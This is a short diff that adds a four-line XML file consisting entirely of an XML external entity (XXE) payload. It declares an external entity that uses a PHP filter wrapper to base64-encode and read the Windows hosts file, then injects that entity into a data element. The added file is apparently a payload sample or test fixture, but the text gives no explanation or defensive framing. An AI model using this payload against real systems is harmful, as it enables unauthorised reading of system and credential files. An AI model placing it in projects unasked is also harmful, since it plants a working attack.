@@ -1,0 +1,4 @@
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=C:\windows\system32\drivers\etc\hosts
+"> ]>
+<data>&example;</data>
